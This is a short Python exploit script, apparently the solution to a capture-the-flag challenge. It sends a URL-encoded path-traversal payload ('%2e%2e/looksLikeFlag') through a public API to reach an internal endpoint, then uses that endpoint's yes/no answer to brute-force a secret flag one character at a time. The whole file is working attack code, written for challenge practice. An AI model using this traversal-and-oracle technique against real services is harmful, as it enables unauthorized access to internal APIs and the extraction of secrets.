import requests
import string

def guess(flag):
    url = 'http://splitline.tw:5000/public_api/'
    payload = {'text': f"%2e%2e/looksLikeFlag?flag={flag}"}
    res = requests.post(url, json=payload).json()
    correct = res['looksLikeFlag']
    return correct

charset = string.ascii_lowercase + string.digits + '_'
charset = [
    char for char in charset 
    if guess(char)
]
print(f'charset = {charset}')

flag = 'FLAG{'
is_end = False
while not is_end:
    is_end = True
    for char in charset:
        flag += char
        correct = guess(flag)
        if correct:
            is_end = False
            break
        flag = flag[:-1]
    print(flag)
flag += '}'
print(flag)
